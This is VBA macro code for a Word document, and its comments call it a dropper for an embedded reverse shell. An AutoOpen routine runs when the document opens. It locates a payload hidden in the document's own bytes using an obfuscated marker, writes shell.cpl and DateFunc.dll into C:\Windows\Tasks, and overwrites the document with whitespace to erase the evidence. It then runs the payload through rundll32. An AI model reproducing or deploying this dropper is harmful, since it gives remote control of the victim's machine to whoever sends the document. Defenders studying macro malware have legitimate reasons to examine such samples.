' This VBA code only works one time, the embedded payload get overwritten after execution 
' it extract DateFunc.dll and shell.cpl, then the function DateDiff gets called from VBA WMI is used 
' for execution of the embedded reverse shell 

Declare Function DateDiff Lib "C:\Windows\Tasks\DateFunc.dll" Alias "DateAdd" (Dates As ExportedStruct) As Boolean

Dim v As ExportedStruct
Type ExportedStruct
  cmd As String
  args As String
End Type


Function DateToDate()
    vbNullCmd = "rundll32"
    vbNullArgs = "shell32,Control_RunDLL C:\Windows\Tasks\shell.cpl"
    vbNullPath = "C:\Windows\Tasks\"
    vbNullPayload = "C:\Windows\Tasks\shell.cpl"
    vbNullFunc = "C:\Windows\Tasks\DateFunc.dll"
    Dim MyDoc As String
    MyDoc = ActiveDocument.FullName
    Filesize = FileLen(MyDoc)
    Dim buffer() As Byte
    ReDim buffer(Filesize)
    File1 = FreeFile
    Dim data As Byte
    Dim pos As Long
    Open (MyDoc) For Binary Access Read As #File1
    Get #File1, 1, buffer
    Close #File1
    token = Chr(102) + Chr(49) + Chr(56) + Chr(49) + Chr(100) + Chr(56) ' Offset = f181d8
    pos = 1
    Do While pos <= Filesize
      If Mid$(token, 1, 1) = Chr(CByte(buffer(pos))) Then
        pos = pos + 1
          If Mid$(token, 2, 1) = Chr(CByte(buffer(pos))) Then
            pos = pos + 1
            If Mid$(token, 3, 1) = Chr(CByte(buffer(pos))) Then
              pos = pos + 1
                If Mid$(token, 4, 1) = Chr(CByte(buffer(pos))) Then
                  pos = pos + 1
                    If Mid$(token, 5, 1) = Chr(CByte(buffer(pos))) Then
                      pos = pos + 1
                        If Mid$(token, 6, 1) = Chr(CByte(buffer(pos))) Then
                          pos = pos - 5
						  ' Offset found
                          Exit Do
                        End If
                    End If
                End If
          End If
      End If
    End If
    pos = pos + 1
  Loop

  File2 = FreeFile
  Open (vbNullPayload) For Binary Access Write As #File2
  
  ' Replace f181d8 with MZ
  buffer(pos) = 77
  buffer(pos + 1) = 90
  buffer(pos + 2) = 144
  buffer(pos + 3) = 0
  buffer(pos + 4) = 3
  buffer(pos + 5) = 0
  
  p = 1
 
  ' Extract shell.cpl
  For y = 1 To 578
    For i = 1 To 50
      Put #File2, p, CByte(buffer(pos))
      pos = pos + 1
      p = p + 1
    Next i
    pos = pos + 50
  Next y
  Close #File2
  
  ' Replace f181d8 with MZ
  buffer(pos) = 77
  buffer(pos + 1) = 90
  buffer(pos + 2) = 144
  buffer(pos + 3) = 0
  buffer(pos + 4) = 3
  buffer(pos + 5) = 0
  
  ' Extract DateFunc.dll
  File3 = FreeFile
  Open (vbNullFunc) For Binary Access Write As #File3
  p = 1
  For y = 1 To 547
    For i = 1 To 50
      Put #File2, p, CByte(buffer(pos))
      pos = pos + 1
      p = p + 1
    Next i
    pos = pos + 50
  Next y
  Close #File3
  
  ' Fill Active document with white text and overwrite embedded payload
  ActiveDocument.Content.Font.Color = vbWhite
  For i = 1 To 500
    ActiveDocument.Content.InsertAfter Text:="                                                                            "
  Next i
  ActiveDocument.Content.Font.Color = vbBlack
  ActiveDocument.Save
  
  v.cmd = vbNullCmd
  v.args = vbNullArgs
  res = DateDiff(v) ' Call external function in DLL
End Function


Sub AutoOpen()
  DateToDate
End Sub
